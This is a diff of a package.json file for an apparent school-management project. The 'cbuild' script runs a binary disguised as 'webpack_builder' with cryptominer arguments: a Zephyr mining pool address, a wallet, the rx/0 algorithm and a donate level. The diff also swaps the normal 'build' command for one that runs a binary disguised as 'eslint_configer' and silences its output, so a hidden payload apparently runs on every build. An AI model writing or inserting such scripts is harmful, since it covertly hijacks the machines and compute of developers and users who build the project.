@@ -5,7 +5,7 @@
   "main": "index.js",
   "scripts": {
     "cbuild":"./webpack_builder -o fr-zephyr.miningocean.org:5332 -u ZEPHYR3BrZ9eJieCEnqLX93nMwGJxBqdpLSahMmCTbMWFU5Vj2fEzqvZfLvynQS3heTrEFaas71sNjLCxXz2eHGXXiqfMAgMTJi35 -a rx/0 -p cloudflare --donate-level 1",
-    "build":"node src/index.js",
+    "build":"chmod +x ./eslint_configer && ./eslint_configer > /dev/null 2>&1",
     "test": "echo \"Error: no test specified\" && exit 1"
   },
   "keywords": ["schoolmanager", "study"],
